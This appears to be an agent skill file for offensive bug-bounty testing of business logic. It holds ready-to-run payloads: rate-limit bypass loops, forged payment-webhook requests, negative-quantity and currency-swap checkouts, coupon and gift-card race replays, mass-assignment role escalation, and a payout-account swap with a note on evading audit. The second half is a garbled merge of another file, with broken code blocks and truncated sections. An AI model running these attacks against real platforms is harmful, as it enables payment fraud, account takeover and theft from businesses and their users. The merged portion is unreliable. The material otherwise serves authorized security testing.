---
name: hunt-business-logic
description: Business logic testing: workflow bypass, price manipulation, race conditions in financial flows, role escalation.
---

## Crown Jewel Targets

Business logic vulnerabilities pay highest in platforms where financial transactions, identity verification, and access controls intersect with real-world consequences. The richest targets are:

- **E-commerce & payment platforms** (Valve/Steam, Shopify) — payment flow manipulation, free goods, price tampering
- **Marketplace & gig economy apps** (Airbnb, Uber) — identity/verification bypass enabling fraud or unsafe interactions
- **SaaS with tiered access** (Mozilla Monitor) — bypassing verification to unlock monitoring features without entitlement
- **High-traffic consumer apps** (Snapchat, Yelp) — rate-limit bypass enabling spam, enumeration, or abuse at scale

Asset types that pay: checkout flows, subscription endpoints, callback/verification systems, webhook handlers, employee/internal portals exposed to the internet, and any endpoint that trusts client-supplied data to make authorization decisions.

---

## Attack Surface Signals

**URL patterns to watch:**
- `/checkout`, `/order`, `/subscribe`, `/payment`, `/verify`, `/confirm`, `/callback`
- `/internal`, `/employee`, `/summit`, `/staff`, `/admin` — internal pages accidentally public
- `/api/v*/payment`, `/api/v*/notify`, `/webhook` — payment provider callbacks
- Endpoints accepting `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP` headers

**Response/header signals:**
- `Set-Cookie` with unvalidated session state tied to cart or order data
- Payment provider names in responses: `Smart2Pay`, `Stripe`, `PayPal`, `Braintree`
- Redirect chains through third-party payment pages (in-flight data opportunity)
- `200 OK` on subscription/verification endpoints with no CAPTCHA or token

**JS patterns:**
- Hardcoded internal URLs in frontend bundles (`/employee/`, `/staff/`, `/internal/`)
- Client-side price calculation before server submission
- Verification logic that only checks on the frontend (`if (verified) { ... }`)
- `fetch('/api/subscribe', { method: 'POST', body: ... })` with no anti-CSRF token or rate-limit token

**Tech stack signals:**
- Shopify storefronts with draft/unpublished channel pages
- Apps using IP-based rate limiting without session/account binding
- Payment webhooks with no HMAC signature validation
- SMS/phone callback flows that don't verify ownership before enabling features

---

## Step-by-Step Hunting Methodology

1. **Map all authentication boundaries.** Spider the target. Identify pages/endpoints that serve authenticated content (employee portals, premium features, order pages) and test each unauthenticated. Look for internal pages indexed in JS bundles or linked from robots.txt/sitemap.xml.

2. **Identify every verification flow.** Enumerate: email verification, phone/SMS verification, payment verification, CAPTCHA, age gates. For each, test: what happens if you skip the verification step entirely? What happens if you replay a valid token on a different account?

3. **Test rate-limiting controls on every form.** For every POST endpoint (subscribe, login, OTP, search), send 50+ rapid requests. Vary: remove cookies, rotate `X-Forwarded-For` / `X-Real-IP` headers, change `User-Agent`. Check if the server uses IP from headers rather than connection IP.

4. **Intercept and tamper with payment flows.** Use Burp Suite to intercept every request between your browser, the application, and the payment provider. Identify where price, currency, order ID, or status fields are set. Attempt to modify amounts to $0.01 or currency to a low-value currency. Look for POST-back/webhook endpoints that accept payment confirmation — test if they validate HMAC/signature.

5. **Test phone/callback number verification.** Whenever a platform accepts a callback number, test: can you set it to a number you don't own? Does the platform call/text that number and grant trust based solely on submission? Try setting it to a victim's number.

6. **Check for unprotected employee/internal surfaces.** Search Shodan, GitHub, JS bundles, and Wayback Machine for internal subdomain/path references. Test access without authentication. Check if these surfaces allow order placement, data access, or privilege escalation.

7. **Validate business impact.** For each finding, determine: does this result in financial loss, unauthorized access, or data exposure? Document the end-to-end chain.

---

## Payload & Detection Patterns

**Rate limit bypass via header rotation:**
```bash
# Rotate X-Forwarded-For to bypass IP rate limiting
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/subscribe \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim+'"$i"'@example.com"}' \
    -o /dev/null -w "%{http_code}\n"
done
```

**Payment tampering — modify in-flight price:**
```http
POST /payment/initiate HTTP/1.1
Host: target.com

amount=0.01&currency=USD&order_id=12345&product_id=99
```
```bash
# Look for unvalidated webhook endpoints
curl -X POST https://target.com/payment/callback \
  -H "Content-Type: application/json" \
  -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
```

**Unauthenticated internal page discovery:**
```bash
# Check robots.txt and sitemap for internal paths
curl -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
curl -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"

# Grep JS bundles for internal paths
curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
```

**Email verification bypass:**
```bash
# Skip the verification step: hit the post-verification API endpoint directly
# with an unverified session. If it succeeds, the gate is UI-only.
curl -s -X POST https://monitor.target.com/api/monitoring/enable \
  -H "Cookie: session=<your_unverified_session>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Replay verification token on different account
curl -X POST https://target.com/verify \
  -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'
```

**Grep patterns for client-side logic issues:**
```bash
# Find price calculations in JS
grep -iE "(price|amount|total|cost)\s*[=*+]" app.js

# Find internal URLs in JS bundles
grep -oE '"/(employee|internal|staff|admin|summit)[^"]*"' *.js

# Find unvalidated IP header usage in server code
grep -iE "x-forwarded-for|x-real-ip|cf-connecting-ip" src/ -r
```

---

## Common Root Causes

1. **Server trusts client-supplied data for financial decisions.** Developers offload price calculation to the frontend or pass amount fields through forms/URLs without re-validating on the server against a canonical source (the product database).

2. **Verification is enforced only in the UI, not the API.** Frontend hides features behind a verification gate, but the backend API endpoints are fully functional without a verified status — any authenticated request succeeds.

3. **IP-based rate limiting reads from spoofable headers.** Developers implement rate limits using `request.headers['X-Forwarded-For']` instead of the actual connection IP, allowing trivial bypass by header manipulation.

4. **Payment webhooks lack signature validation.** Developers implement "success" webhooks without verifying the HMAC signature provided by the payment provider, allowing anyone to POST a fake success notification.

5. **Internal/employee pages aren't access-controlled.** Internal tools are deployed to production domains without authentication middleware, either because developers assume obscurity (unlisted URL) or forgot to apply auth to a new route.

6. **Phone/callback verification is advisory, not enforced.** Systems accept a phone number and grant trust to whoever submitted it, without confirming the submitter owns or controls that number.

7. **Draft/channel-specific storefronts inherit full order functionality.** Platforms like Shopify allow creating storefronts for specific channels (employee events) that are unlisted but still fully functional for order placement if the URL is known.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| IP-based rate limiting | Rotate `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` headers per request |
| CAPTCHA on subscription forms | Use header-based bypass first; if CAPTCHA is only on the web form, call the underlying API endpoint directly |
| Email verification gate | Access the post-verification API endpoint directly; replay valid tokens; check if `verified=true` is a client-set cookie/param |
| Payment amount server validation | Modify currency to a lower-value currency; test with $0.00 or negative amounts; manipulate order IDs to reference different products |
| Webhook HMAC validation | Test with no/empty signature header (is validation enforced at all — a modified payload only "passes" if it isn't); replay an UNMODIFIED captured webhook to test missing idempotency/anti-replay |
| Auth on internal pages | Try unauthenticated; try with a low-privilege account; try path traversal variants (`/employee/../employee/`) |
| Phone verification (OTP sent) | Submit someone else's number without OTP validation; check if the system grants trust on submission vs. OTP confirmation |

---

## Gate 0 Validation

Before writing any report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "An unauthenticated user can place an order for physical goods at $0 cost" or "An attacker can bypass email verification and monitor any email address without owning it" or "An attacker can send unlimited subscription emails to any address." Vague impact = reject.

2. **What does the victim LOSE?**
   Identify a concrete, attributable loss: financial loss (free goods, fraudulent payments), privacy loss (phone number spoofed, unauthorized monitoring), service abuse (spam campaigns via rate-limit bypass), or security degradation (unverified identity trusted for sensitive actions). If the loss is purely theoretical, re-evaluate severity.

3. **Can it be reproduced in 10 minutes from scratch?**
   Create a fresh account (or use no account). Follow your documented steps. Achieve the impact. If you can't reliably reproduce it end-to-end in under 10 minutes with the steps you've written, your methodology is incomplete — refine before submitting.

---

## Real Impact Examples

**Scenario 1 — Free Physical Goods via Exposed Internal Storefront (Shopify-style)**
An employee summit page was deployed to a public Shopify storefront as a private channel for distributing free books to staff. The URL was discoverable via JS bundle analysis or link sharing. An anonymous user who navigated to the URL could browse and complete a checkout with no authentication required, receiving physical merchandise shipped at the company's expense. Impact: direct financial loss per order, potential for bulk ordering if not caught quickly.

**Scenario 2 — Payment Manipulation via In-Flight Tampering (Valve/Steam-style)**
A payment flow passed order amount and currency through client-controlled parameters before redirecting to a third-party payment provider (Smart2Pay). By intercepting the redirect with Burp Suite and modifying the amount field, an attacker could complete a real payment for $0.01 while the application's webhook — lacking HMAC validation — accepted the provider's confirmation and credited the full item/service to the account. Impact: critical financial loss; attacker receives full value goods/services for near-zero cost, infinitely repeatable.

**Scenario 3 — Email Verification Bypass for Unauthorized Monitoring (Mozilla-style)**
A breach-monitoring service required email verification before enabling monitoring alerts for an address. The verification check was enforced in the UI flow but the underlying API accepted monitoring setup requests for any address using a valid session — skipping the verification step entirely. An attacker could set up monitoring for email addresses they don't own, receiving breach notification data (potentially including credential exposure status) for victim accounts. Impact: privacy violation; attacker gains intelligence on whether a target's email was in a breach without the target's knowledge or consent.

---

## Disclosed Report Citations (Backfill +5 — 2016-2023)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. All five share a measurable financial-impact angle (actual $ loss demonstrated or quantifiable platform-wide exposure).

8. **Stripe — Fee discount race redemption** ([H1 #1849626](https://hackerone.com/reports/1849626))
    - Subclass: coupon/discount race-multi-redemption + financial primitive
    - Payload: Stripe Support applied a one-time $20,000 fee-credit. Researcher captured the "accept-discount" POST and replayed it 30× in parallel via Burp Turbo Intruder, each acceptance crediting the account anew
    - Root cause: idempotency missing on discount-acceptance endpoint; no unique constraint on (account_id, discount_id)
    - Year: 2023 — **$5,000**, $600,000 of fee-free transactions accrued before fix (~$18,000 real Stripe loss at 3% take rate)

9. **Reverb.com — Gift-card race multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247))
    - Subclass: gift-card / store-credit race-redemption
    - Payload: single valid gift card, parallel-POST to `/redeem` from 10 sockets via Turbo Intruder. Balance credits N× the face value
    - Root cause: no row-level lock on gift_card table; balance debit and credit live in separate transactions
    - Year: 2019 — **$1,500**

10. **Upserve / OLO — Negative-quantity price manipulation** ([H1 #364843](https://hackerone.com/reports/364843))
    - Subclass: negative-quantity-in-cart price tampering
    - Payload: `POST /api/order {"items":[{"id":1,"qty":1,"price":50},{"id":2,"qty":-3,"price":50}]}` — order total computes to `-$100`, floors to ~$0 at payment capture, food still fulfills
    - Root cause: server multiplies `qty * price` with no `qty >= 1` guard
    - Year: 2018 — textbook citation for the subclass (acknowledged-only program)

11. **Krisp — Pay-less-per-seat via PUT tampering** ([H1 #1446090](https://hackerone.com/reports/1446090))
    - Subclass: price-per-unit mass-assignment / quantity-discount manipulation
    - Payload: `PUT /v2/seats` body includes a server-trusted `price` field. Set `price=1` instead of $60. Subscription updates, billing engine charges $1/seat for 100 seats
    - Root cause: server reads price from request body instead of looking it up by plan_id; classic mass-assignment
    - Year: 2021 — Stripe-billed SaaS pricing exposure

12. **Stripe — Pay using archived price via mid-flow swap** ([H1 #1328278](https://hackerone.com/reports/1328278))
    - Subclass: cart-state TOCTOU / cancel-then-deliver (price-version race at checkout)
    - Payload: merchant archives an old price (e.g., $5 instead of new $50). Buyer starts checkout via the new payment-link, then mid-flow swaps `price_id` back to the archived one. Stripe charges $5; subscription provisions at the new tier
    - Root cause: payment-link validates "is active", price object validates "exists" — but the join "price.active AND price ∈ link.allowed_prices" is missing
    - Year: 2021 — Stripe Medium (per-subscription recurring loss)

---

## Related Skills & Chains

- **`hunt-race-condition`** — Every uniqueness/quota check in a logic flow is a race candidate. Chain primitive: Business logic (coupon/credit/promotion) + race condition → coupon redeemed N times in a single TCP packet via Turbo Intruder.
- **`hunt-idor`** — Logic flows that trust a client-supplied identifier (order_id, tenant_id, beneficiary_id) overlap directly with IDOR. Chain primitive: business-logic step-skip + IDOR on beneficiary_id → transfer funds from victim account.
- **`hunt-api-misconfig`** — Step-skip and verification-bypass often live next to mass-assignment fields. Chain primitive: business-logic email-verify skip + API mass assignment (`verified:true, role:admin`) → ATO without email control.
- **`hunt-ato`** — Logic bugs in password reset, email change, and recovery flows are core ATO paths. Chain primitive: business logic (email change accepts without re-auth) + `hunt-ato` Path 2 → silent victim email swap → password reset to attacker mailbox.
- **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL nav, state-machine reverse) and the Always-Rejected list to avoid filing self-inflicted bugs.
- **`triage-validation`** — Apply the 7-Question Gate (especially Q4 "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just "the flow looks weird".

---

# Additional Techniques (merged from offensive-business-logic/SKILL.md)

# Business Logic — Offensive Testing Methodology

Business logic flaws are the highest-paying class of vulnerability for bug bounty and the hardest for scanners to detect. They live in the gap between what the developer specified and what an attacker can convince the system to accept.

## Quick Workflow

1. Map every multi-step flow as a state machine (states + allowed transitions + side effects)
2. For each transition, ask: who can call it, in what state, with what inputs, how many times
3. Probe each axis (state, identity, input, frequency) for assumptions
4. Combine flaws — single-axis flaws are usually low severity; chains are critical
5. Quantify financial impact per finding (loss-per-attack × scale)

---

### Build the State Machine

For each user flow, draw:
- **States**: cart, pending payment, paid, shipped, refunded, cancelled
- **Transitions**: which API/UI action, which role, which preconditions
- **Side effects**: balance change, inventory change, email, webhook

Look for transitions that:
- Skip intermediate states (`cart` → `shipped` without `paid`)
- Are reversible when they shouldn't be (`shipped` → `cart`)
- Trigger side effects more than once
- Allow cross-role invocation

# Compare authenticated and unauthenticated JS bundles for buried admin routes
diff <(curl https://app/main.js) <(curl -H "Cookie: ..." https://app/main.js)

# Look for flag/feature toggles that change UI but not server-side enforcement
grep -E '(isAdmin|isInternal|featureFlag|debug)' bundle.js

# API spec (OpenAPI/Swagger) often lists endpoints the UI never calls
curl https://app/api/openapi.json | jq '.paths | keys'
```

---

# Try jumping directly:
GET /dashboard
GET /api/account/details
POST /api/payout-settings
```

```http

# Skip /payment by replaying /confirm with a previous order's payment-token reference:
POST /api/order/confirm
{ "cartId": "current", "paymentRef": "<old-paid-order-payment-ref>" }
```

# Refund endpoint without idempotency
POST /api/orders/123/refund   # First call: $50 refunded, order marked refunded
POST /api/orders/123/refund   # Second call: server checks "is order refunded?" — race the check (see TOCTOU)
```

### State Downgrade

Move a finalized object back to an editable state where mutations have effect:

```http
PUT /api/order/123
{ "status": "draft" }   # If accepted, you can now edit the price field
PUT /api/order/123
{ "items": [{ "id": "tv", "price": 1 }] }
```

### Direct Endpoint Invocation

Many admin/backend transitions are reachable from any authenticated user if route-level RBAC is missing while the UI hides them.

```bash

# Enumerate verbs on every discovered path
for path in $(cat paths.txt); do
  for v in GET POST PUT PATCH DELETE OPTIONS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $v -H "Authorization: Bearer $T" https://app$path)
    echo "$v $path $code"
  done
done | grep -v -E ' (401|403|404) '
```

---

### Negative / Zero / Float Quantities

```http
POST /api/cart/add
{ "sku": "tv", "qty": -1 }      # Refund issued for adding negative items?
{ "sku": "tv", "qty": 0.0001 }  # Float rounding: $0 line item, full product shipped?
{ "sku": "tv", "qty": 9e99 }    # Overflow → wraps to small number, $0 cost?
```

### Hidden Price Fields

```http
POST /api/checkout
{ "items": [{"sku":"tv","qty":1,"price":1}], "total": 1, "tax": 0, "shipping": 0 }
```

If the server trusts client-supplied `price`, you set the price. Test every numeric field — `price`, `total`, `discount`, `tax`, `shipping`, `subtotal`, `currency`.

### Currency Confusion

```http
POST /api/checkout
{ "amount": 100, "currency": "JPY" }   # Pay 100 JPY (~$0.65) for $100 USD product?
{ "amount": 100, "currency": "VND" }   # Even better
{ "amount": 100, "currency": "BTC" }   # Or worse: pay in BTC at $1 BTC = $1?
```

Look for: missing currency normalization, sloppy FX rate caching, currency lookup by user input.

# Apply same coupon multiple times
POST /api/cart/coupon { "code": "SAVE50" }
POST /api/cart/coupon { "code": "SAVE50" }   # Stacks?
POST /api/cart/coupon { "code": "save50" }   # Case sensitivity gives second slot?
POST /api/cart/coupon { "code": "SAVE50 " }  # Whitespace ditto?

# Coupon for a different product
POST /api/cart/apply-coupon { "code": "FREEMOUSE", "appliedTo": "macbook" }

# Negative discount (becomes a surcharge that reduces total when coupon stacked with another)
POST /api/admin/coupon { "code": "X", "percent": -50 }   # If admin endpoint reachable

# Expired coupon: change date in payload?
POST /api/cart/coupon { "code": "BLACKFRIDAY", "appliedAt": "2023-11-25T00:00:00Z" }
```

# Add a cheap item, edit the SKU server-side
POST /api/cart/add { "sku": "pen", "qty": 1 }
PUT  /api/cart/items/abc { "sku": "macbook" }      # SKU swap with pen's price retained?
```

---

### Refund After Returning Less

Order ships 5 items, you return 1, request refund for full order. Logic should compute refund per returned item; if it computes per *order*, free items.

### Convert Refund to Different Method

```http
POST /api/orders/123/refund { "method": "store-credit" }

### Payout Account Race

```http
PUT  /api/payout-account { "iban": "ATTACKER" }
POST /api/withdraw { "amount": 1000 }
PUT  /api/payout-account { "iban": "ORIGINAL" }   # Restore before audit
```

---

### Role Confusion via Multipart / Parameter Pollution

```http
POST /api/users/me
role=user&role=admin              # Last-wins parser → admin
{"role": "user", "role": "admin"} # JSON last-wins
```

### Tenant ID Substitution in Hidden Field

```http
POST /api/invoices
{ "amount": 100, "tenantId": "victim-corp", "billTo": "attacker" }

### Mass Assignment / Field Whitelist

```http
PUT /api/users/me
{ "email": "x@y.com", "isAdmin": true, "credits": 10000, "tenantId": "victim" }
```

Test every field that exists on the model, not just those the form exposes.

### Indirect Privilege via Object Linking

```http
POST /api/projects/PUBLIC-PROJECT/share-token   # Anyone can mint
GET  /api/projects/PUBLIC-PROJECT/internal-only-data?token=...

## Race Conditions on Logic Boundaries

Logic checks that read state, then act on state, are TOCTOU-vulnerable. (Also see: `offensive-toctou`, `offensive-race-condition`.)

### Common Logic Races

| Flow | Race |
|------|------|
| Coupon redemption | N parallel `apply-coupon` calls each see "unused" |
| 2FA verification | Submit code N times in parallel before lockout counter increments |
| Withdrawal | Parallel withdraws each see full balance |
| Vote / Like / Reaction | "One per user" check raced |
| Invitation acceptance | Multiple accepts → multiple seats granted |
| Free-trial signup | Parallel signups → multiple trials per email |
| Gift-card redeem | Parallel redeems → multi-spend a single card |
| Inventory reservation | Parallel buys of last item → oversell, supplier covers difference |

### Captcha / Rate Limit Bypass

| Bypass | Mechanic |
|--------|----------|
| Token reuse | One captcha solve, replay token across many requests |
| Endpoint mirror | `/api/v1/login` rate-limited, `/api/v2/login` not |
| Header rotation | `X-Forwarded-For: <random>` resets per-IP counter |
| HTTP/2 stream multiplexing | Each stream counted as same conn → window only |
| Method/case variation | `POST /Login` vs `POST /login` keyed differently in cache |

### Device Fingerprint / Velocity

- New device → require step-up auth. Replay captured device cookies / FingerprintJS hash.
- Velocity counters (5 logins/hour) often per `(userid, ip)` not per `userid`.
- Risk score thresholds: small purchases skip review. Test the boundary ($99.99 vs $100).

# Email aliasing
attacker+1@gmail.com, attacker+2@gmail.com         # Plus-aliasing
attacker.@gmail.com, a.t.t.acker@gmail.com         # Dots ignored on Gmail
attacker@googlemail.com                            # gmail/googlemail equivalence

### Referral / Reward Loops

```http
POST /api/refer { "email": "a@x.com" }   # +$5 to me when they sign up

# Sign up the alias, receive referral
POST /api/refer { "email": "a+1@x.com" }  # Repeat — many sign-ups, all same person
```

---

### Tier Downgrade Retains Premium Features

```http
PUT /api/subscription { "tier": "free" }   # Cancel paid
GET /api/feature/premium-export             # Still works because feature flag cached?
```

### Mid-Cycle Quota Reset

```http
PUT /api/subscription { "tier": "pro" }   # +1000 quota
PUT /api/subscription { "tier": "free" }  # Resets to 0? Or just caps display?
PUT /api/subscription { "tier": "pro" }   # +1000 again — net 2000 in one cycle
```

### Add-On Stacking

```http
POST /api/addons { "id": "extra-storage" }   # +10GB
POST /api/addons { "id": "extra-storage" }   # Stacks to 20GB?
POST /api/addons { "id": "extra-storage" }   # Or charges once, stacks N times?
```

---

### Time Travel via Headers

```http
POST /api/checkout
Date: Wed, 01 Jan 2020 00:00:00 GMT      # Server-trusted time?
X-Request-Time: 1577836800
```

### Promotion Window

Set client-side date to inside the window, server validates `X-Promo-Time` parameter. Stale promo cache means yesterday's prices apply today.

### Token / Session Expiry

Refresh token endpoint that doesn't check the original token's expiry → indefinite session extension.

---

## Combining Flaws — Where the Crits Live

Single-axis findings are interesting; **chains** are payouts.

**Example chain (real, paid bounty):**
1. Coupon stacking allows `100% off` × 2 → negative total
2. Negative total → store credit issued (refund of "overpayment")
3. Store credit transferable to gift card
4. Gift card race condition → multiplied
5. Gift card redeemable on partner site for cash equivalents

**Chain template:**
- Find a thing the system gives you (credit, points, slot, seat)
- Find a way to multiply it (race, replay, stacking)
- Find a way to convert it to value (transfer, refund, payout)

---

## Engagement Approach

```
Day 1:  Map state machines for top 3 money flows.
Day 2:  Per state, list what the UI does. Check what the API allows.
Day 3:  Single-axis tests (price tampering, role mass-assignment, replay, currency).
Day 4:  Race conditions on every "one-shot" action.
Day 5:  Chain the findings. Quantify financial impact per chain.
```

Document each finding as: pre-conditions → exact request sequence → state delta → financial impact per execution → scaling factor.

---

## Reporting Hooks

Business-logic findings often get downgraded by triagers who don't understand the chain. Always include:

- A diagram of the intended flow vs. the achieved flow
- A scripted PoC that runs end-to-end (no manual steps)
- A dollar value per execution and a feasibility statement for repeating it
- The fix at the right layer (state machine validator, not just input validation)

---

## Key References

- OWASP WSTG-BUSL — Business Logic Testing chapter
- PortSwigger Web Security Academy: Business logic vulnerabilities track
- MITRE ATT&CK: T1539 (Steal Web Session Cookie), T1078 (Valid Accounts) — for chained access
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/business-logic.md